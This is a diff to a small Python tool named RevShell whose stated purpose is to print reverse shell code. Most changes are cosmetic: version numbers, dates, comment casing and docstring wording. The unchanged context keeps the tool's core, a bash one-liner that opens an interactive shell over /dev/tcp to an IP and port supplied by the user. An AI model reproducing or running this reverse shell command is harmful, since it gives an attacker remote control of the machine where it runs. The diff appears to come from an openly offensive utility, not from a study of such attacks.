@@ -1,14 +1,14 @@
-#!/usr/bin/env python3
+#!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
 #[*] Name of the tool: RevShell
 #[*] Description: Print the code of a reverse shell.
-#[*] Version: 2.0
+#[*] Version: 1.1
 #[*] Author: JRIC2002
 #[*] Date of creation: 10/05/2020
-#[*] Date of last update: 10/05/2020
+#[*] Date of last update: 21/08/2020
 
-#MODULES
+#Modules
 
 #External modules
 import ipaddress
@@ -77,7 +77,7 @@ class Start:
     def version(self):
         """ Imprime la versión de la herramienta RevShell. """
 
-        print("{}#RevShell version 1.0".format(color.white))
+        print("{}#RevShell version 1.1".format(color.white))
 
     def error(self):
         """ Imprime un mensaje de error. """
@@ -116,7 +116,7 @@ class Functions:
             sys.exit(1)
 
     def rev_shell(self, ip, port):
-        """ Imprime shell inversas. """
+        """ Imprime reverse shells. """
         
         a = "bash -i >& /dev/tcp/{}/{} 0>&1".format(ip, port)
         b = "More reverse shells"
@@ -126,7 +126,7 @@ class Functions:
 #Instancia de la clase Functions
 functions = Functions()
 
-#START
+#Start
 if len(sys.argv) == 1:
     start.logo()
     start.help_menu()
